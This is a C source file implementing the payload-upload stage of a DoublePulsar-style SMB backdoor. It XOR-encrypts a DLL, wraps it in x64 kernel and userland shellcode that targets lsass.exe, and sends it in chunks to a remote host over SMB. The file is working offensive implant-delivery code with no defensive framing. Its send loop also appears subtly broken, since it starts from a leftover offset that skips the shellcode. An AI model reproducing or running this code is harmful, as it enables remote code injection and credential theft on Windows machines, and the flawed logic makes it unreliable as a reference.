#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef SMB_CHUNK_SIZE
#define SMB_CHUNK_SIZE 4096
#endif

extern const unsigned char KERNEL_SHELLCODE_X64_PART1[];
extern const size_t KERNEL_SHELLCODE_X64_PART1_LEN;
extern const unsigned char KERNEL_SHELLCODE_X64_PART2[];
extern const size_t KERNEL_SHELLCODE_X64_PART2_LEN;
extern const unsigned char USERLAND_SHELLCODE_X64[];
extern const size_t USERLAND_SHELLCODE_X64_LEN;
extern const unsigned char DP_EXEC_PKT[];
extern const size_t DP_EXEC_PKT_LEN;

extern uint32_t DoublePulsarXORKeyCalculator(uint32_t key);
extern void xor_buffer(unsigned char *buffer, size_t length, uint32_t key);
extern int smb_send(const char *ip, int port, const unsigned char *packet,
                    size_t packet_length);

static uint32_t
upload_payload_process_hash(const char *name)
{
    uint32_t hash = 0;
    const unsigned char *p = (const unsigned char *)name;

    while (*p != '\0') {
        unsigned char c = *p++;

        if (c >= 'a' && c <= 'z')
            c = (unsigned char)(c - ('a' - 'A'));

        hash = (hash >> 13) | (hash << 19);
        hash += c;
    }
    return hash;
}

int
upload_payload(const char *ip, int port, const char *payload_path,
               int payload_type)
{
    FILE *file = NULL;
    unsigned char *dll = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    size_t dll_length = 0;
    size_t payload_length = 0;
    size_t packet_capacity = 0;
    size_t offset = 0;
    long file_length;
    uint32_t process_hash;
    uint32_t xor_key;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    file = fopen(payload_path, "rb");
    if (file == NULL)
        goto done;

    if (fseek(file, 0, SEEK_END) != 0)
        goto done;
    file_length = ftell(file);
    if (file_length < 0 || fseek(file, 0, SEEK_SET) != 0)
        goto done;

    dll_length = (size_t)file_length;
    if (dll_length == 0)
        goto done;

    dll = malloc(dll_length);
    if (dll == NULL)
        goto done;
    if (fread(dll, 1, dll_length, file) != dll_length)
        goto done;

    if (fclose(file) != 0) {
        file = NULL;
        goto done;
    }
    file = NULL;

    xor_key = DoublePulsarXORKeyCalculator(0);
    xor_buffer(dll, dll_length, xor_key);

    process_hash = upload_payload_process_hash("lsass.exe");
    payload_length = KERNEL_SHELLCODE_X64_PART1_LEN + sizeof(process_hash) +
                     KERNEL_SHELLCODE_X64_PART2_LEN +
                     USERLAND_SHELLCODE_X64_LEN + dll_length;
    payload = malloc(payload_length);
    if (payload == NULL)
        goto done;

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1,
           KERNEL_SHELLCODE_X64_PART1_LEN);
    offset += KERNEL_SHELLCODE_X64_PART1_LEN;
    memcpy(payload + offset, &process_hash, sizeof(process_hash));
    offset += sizeof(process_hash);
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2,
           KERNEL_SHELLCODE_X64_PART2_LEN);
    offset += KERNEL_SHELLCODE_X64_PART2_LEN;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64,
           USERLAND_SHELLCODE_X64_LEN);
    offset += USERLAND_SHELLCODE_X64_LEN;
    memcpy(payload + offset, dll, dll_length);

    if (DP_EXEC_PKT_LEN > SIZE_MAX - SMB_CHUNK_SIZE)
        goto done;
    packet_capacity = DP_EXEC_PKT_LEN + SMB_CHUNK_SIZE;
    packet = malloc(packet_capacity);
    if (packet == NULL)
        goto done;

    while (offset < payload_length) {
        size_t chunk_length = payload_length - offset;

        if (chunk_length > SMB_CHUNK_SIZE)
            chunk_length = SMB_CHUNK_SIZE;

        memcpy(packet, DP_EXEC_PKT, DP_EXEC_PKT_LEN);
        memcpy(packet + DP_EXEC_PKT_LEN, payload + offset, chunk_length);
        if (smb_send(ip, port, packet, DP_EXEC_PKT_LEN + chunk_length) != 0)
            goto done;

        offset += chunk_length;
    }

    result = 0;

done:
    if (file != NULL)
        fclose(file);
    free(packet);
    free(payload);
    free(dll);
    return result;
}